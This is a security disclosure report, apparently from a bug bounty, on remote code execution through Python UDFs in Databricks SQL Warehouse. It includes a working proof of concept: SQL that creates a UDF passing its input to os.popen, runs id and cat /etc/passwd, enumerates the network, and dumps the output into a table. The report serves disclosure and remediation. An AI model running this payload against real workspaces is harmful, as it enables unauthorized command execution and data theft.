# Databricks: Remote Code Execution via Python UDF with Default User Permissions

## Summary
Any authenticated workspace user can execute arbitrary operating system commands on Databricks SQL Warehouse infrastructure through Python User-Defined Functions (UDFs). The default Unity Catalog permissions grant `CREATE FUNCTION` privilege to all workspace users (`_workspace_users` group), enabling low-privileged users to create UDFs that execute shell commands via `os.popen()`.

## Severity
**HIGH (CVSS 7.2)**
- Attack Vector: Network
- Attack Complexity: Low
- Privileges Required: Low (any workspace user)
- User Interaction: None
- Scope: Changed
- Confidentiality: Low
- Integrity: Low
- Availability: Low

## Affected Component
- **Product**: Databricks SQL Warehouse (Serverless)
- **Feature**: Python User-Defined Functions in Unity Catalog
- **Default Configuration**: All new workspaces

## Vulnerability Details

### Root Cause
1. **Default Permissions**: Unity Catalog grants `CREATE FUNCTION` to `_workspace_users` group by default on the `workspace.default` schema
2. **Unsafe Python Execution**: Python UDFs allow importing `os` module and executing shell commands via `os.popen()`
3. **No Function Code Validation**: Databricks does not block dangerous imports or system calls in UDF code

### Attack Flow
1. Attacker obtains any valid workspace user account (even lowest privilege)
2. Attacker creates Python UDF with shell command execution
3. Attacker executes arbitrary commands on the SQL Warehouse infrastructure
4. Attacker gathers system information, potentially pivots to other attacks

## Proof of Concept

### Environment
- Workspace URL: `https://dbc-4b448b2e-59b6.cloud.databricks.com`
- User: `sarasofia3@doncong.com` (Non-admin, regular workspace user)
- SQL Warehouse: Serverless

### Step 1: Verify Default Permissions
```sql
SHOW GRANTS ON SCHEMA workspace.default;
```

**Result:**
```
_workspace_users_workspace_3047257800510966 | CREATE FUNCTION | SCHEMA | workspace.default
```

### Step 2: Create Malicious UDF
```sql
CREATE OR REPLACE FUNCTION workspace.default.rce_test(cmd STRING) 
RETURNS STRING 
LANGUAGE PYTHON AS $$ 
import os
return os.popen(cmd).read() 
$$
```

**Result:** `SUCCEEDED` - Function created successfully by non-admin user

### Step 3: Execute Arbitrary Commands

**Command: `id`**
```sql
SELECT workspace.default.rce_test('id')
```
**Result:**
```
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu)
```

**Command: `cat /etc/passwd`**
```sql
SELECT workspace.default.rce_test('cat /etc/passwd | head -5')
```
**Result:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
```

**Command: `hostname`**
```sql
SELECT workspace.default.rce_test('hostname')
```
**Result:** `sandbox`

**Command: Network enumeration**
```sql
SELECT workspace.default.rce_test('ip addr')
```
**Result:**
```
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 
    inet 127.0.0.1/8
2: eth0: <UP,LOWER_UP> mtu 1500 
    inet 10.22.0.5/24
```

## Impact Assessment

### What Attacker CAN Do:
- Execute arbitrary shell commands as `uid=1000(ubuntu)`
- Read system files (`/etc/passwd`, `/proc/*`, etc.)
- Enumerate network configuration
- Run Python code with full stdlib access
- Potentially conduct DoS attacks on warehouse resources
- Gather reconnaissance for further attacks

### What Is Mitigated (Sandbox):
| Test | Result |
|------|--------|
| AWS IMDS (169.254.169.254) | ❌ Blocked (URLError: timed out) |
| External DNS resolution | ❌ Blocked (Temporary failure) |
| External HTTP requests | ❌ Blocked (Connection refused) |
| `/Workspace` directory | ❌ Operation not permitted |
| `/Volumes` directory | ❌ Operation not permitted |
| Docker socket | ❌ Not present |
| Kernel module loading | ❌ No modules in /lib/modules |
| Privileged capabilities | ❌ CapEff: 0000000000000000 |

### Sandbox Environment Details:
```
Hostname: sandbox
User: ubuntu (uid=1000)
Kernel: 4.4.0 (custom)
Network: 
  - eth0: 10.22.0.28/24 (isolated)
  - veth_net: 10.22.1.x/24 (gateway to external)
  - Default gateway: 10.22.1.1
Filesystem:
  - Root: read-only 9p mount
  - /tmp: writable tmpfs
  - /Volumes: mounted but access denied
  - /Workspace: mounted but access denied
Python: 3.11 with databricks-sdk installed
DBR Version: 17.2
Process: python -m udfserver.server [::]:8000
```

### Business Impact:
1. **Confidentiality**: System information disclosure, infrastructure enumeration
2. **Integrity**: Potential to modify UDF behavior affecting other users
3. **Availability**: Resource exhaustion possible via fork bombs or crypto mining
4. **Compliance**: Unexpected code execution may violate security policies
5. **Trust**: Low-privilege users gaining OS-level access breaks security model

## Remediation Recommendations

### Immediate (Short-term):
1. **Revoke default CREATE FUNCTION** from `_workspace_users` group
2. **Restrict to admins only** for Python UDF creation
3. **Audit existing UDFs** for malicious code

### Long-term:
1. **Sandbox hardening**: Block `os`, `subprocess`, `socket` imports in Python UDFs
2. **Code validation**: Implement AST scanning for dangerous patterns
3. **Seccomp profiles**: Further restrict syscalls in UDF containers
4. **Logging**: Alert on UDF creation with system module imports
5. **Network isolation**: Continue blocking metadata and external access

## Data Exfiltration PoC

Despite network isolation, data can be exfiltrated via tables:

```sql
-- Exfiltrate system data to a table
CREATE TABLE workspace.default.exfil_data AS 
  SELECT 
    workspace.default.rce_test('cat /etc/passwd') as passwd,
    workspace.default.rce_test('whoami') as user,
    workspace.default.rce_test('hostname') as host,
    workspace.default.rce_test('ip route') as routes;

-- Query exfiltrated data
SELECT * FROM workspace.default.exfil_data;
```

**Result:**
- passwd: 29 lines of /etc/passwd
- user: ubuntu
- host: sandbox
- routes: full routing table

## Timeline
- **2025-12-06**: Vulnerability discovered during authorized penetration test
- **2025-12-06**: PoC developed and documented
- **2025-12-06**: Report submitted to Databricks via HackerOne

## References
- Databricks Unity Catalog Privileges: https://docs.databricks.com/en/data-governance/unity-catalog/manage-privileges/index.html
- Python UDF Documentation: https://docs.databricks.com/en/udf/python.html
- Similar: CVE-2023-32697 (SQLite JDBC RCE via UDF)

---

**Researcher**: Authorized Penetration Tester
**Program**: Databricks Bug Bounty (HackerOne)

